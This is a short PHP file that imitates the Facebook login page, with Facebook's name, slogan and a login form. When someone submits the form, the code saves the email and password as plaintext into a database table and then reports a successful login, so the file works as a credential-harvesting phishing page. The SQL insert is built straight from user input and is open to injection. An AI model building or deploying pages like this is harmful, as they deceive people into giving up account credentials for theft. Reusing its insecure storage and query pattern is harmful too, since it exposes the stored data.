<?php

session_start();

include("db.php");

if($_SERVER['REQUEST_METHOD'] == "POST" )
{
  $gmail = $_POST['mail'];
  $password = $_POST['pass'];

if(!empty($gmail) && !empty($password) && !is_numeric($gmail))
{
$query = "insert into form(email , pass) values('$gmail','$password')";

mysqli_query($con, $query);

echo "<script type='text/javascript'> alert('Sucessfully Login')</script>";
}

else
{
  echo "<script type='text/javascript'> alert(' Login Failed ')</script>";
}

}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Connect with friends and the world </p>
          <p> around you on Facebook.</p>
        </div>
        <form method="POST">
          <label>Email</label>
          <input type="email"  name="mail" required>
          <label>Password</label>
          <input type="password"  name="pass" required>
          <div class="link">
            <button type="submit" class="login">Login</button>
            <a href="#" class="forgot">Forgot password?</a>
          </div>
          <hr>
          <div class="button">
            <a href="#">Create new account</a>
          </div>
        </form>
      </div>
    </div>
  </body>
</html>